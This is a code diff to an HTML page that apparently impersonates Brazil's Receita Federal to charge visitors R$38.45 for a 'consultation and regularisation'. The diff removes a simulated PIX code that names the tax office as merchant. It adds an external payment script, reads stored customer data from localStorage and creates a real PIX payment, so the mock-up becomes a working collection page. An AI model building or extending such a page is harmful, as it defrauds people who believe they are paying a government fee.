@@ -736,6 +736,7 @@
             margin-top: 15px;
         }
     </style>
+    <script src="assets/nitro-pix.js"></script>
 </head>
 
 <body>
@@ -1238,39 +1239,32 @@
                     loaderContainer.style.display = 'block';
                     qrCodeContainer.style.display = 'none';
 
-                    // Simular resposta da API localmente
-                    await new Promise(resolve => setTimeout(resolve, 2000)); // Simula delay da API
+                    await new Promise(resolve => setTimeout(resolve, 800));
 
-                    // Gerar código PIX simulado
-                    const pixCode = '00020126580014br.gov.bcb.pix0136' + generateRandomString(36) + '52040000530398654041' + '38.45' + '5802BR5925SECRETARIA DA RECEITA FE6009SAO PAULO62070503***63' + generateChecksum();
-
-                    const data = {
-                        success: true,
-                        pixCode: pixCode,
-                        transactionId: 'RFB' + new Date().getFullYear() + generateRandomString(9).toUpperCase(),
-                        orderId: 'RFB' + new Date().getFullYear() + generateRandomString(9).toUpperCase()
-                    };
+                    const storedCustomerData = JSON.parse(localStorage.getItem('customerData') || '{}');
+                    const data = await window.NitroPix.createPixPayment(storedCustomerData, {
+                        amount: 38.45,
+                        description: 'Pagamento de consulta e regularização',
+                        itemTitle: 'Consulta e regularização',
+                        orderPrefix: 'CONSULTA',
+                        productId: 'consulta_regularizacao_3845'
+                    });
 
                     if (data.success && data.pixCode) {
-                        // Salvar ID da transação para monitoramento
                         currentTransactionId = data.transactionId || data.orderId;
 
-                        // Atualizar número do documento com ID da transação
                         const docNumber = document.getElementById('documentNumber');
                         if (docNumber && currentTransactionId) {
                             docNumber.textContent = currentTransactionId.substring(0, 13).toUpperCase();
                         }
 
-                        // Gerar QR code a partir do código PIX usando uma biblioteca externa
-                        const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pixCode)}`;
+                        const qrCodeUrl = data.qrCodeUrl || `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pixCode)}`;
                         document.getElementById('qrCodeImage').src = qrCodeUrl;
                         document.getElementById('pixCode').textContent = data.pixCode;
 
                         loaderContainer.style.display = 'none';
                         qrCodeContainer.style.display = 'block';
                         startPixCountdown();
-
-                        // Iniciar monitoramento do pagamento
                         startPaymentMonitoring();
                     } else {
                         throw new Error(data.error || 'Erro ao gerar o pagamento');
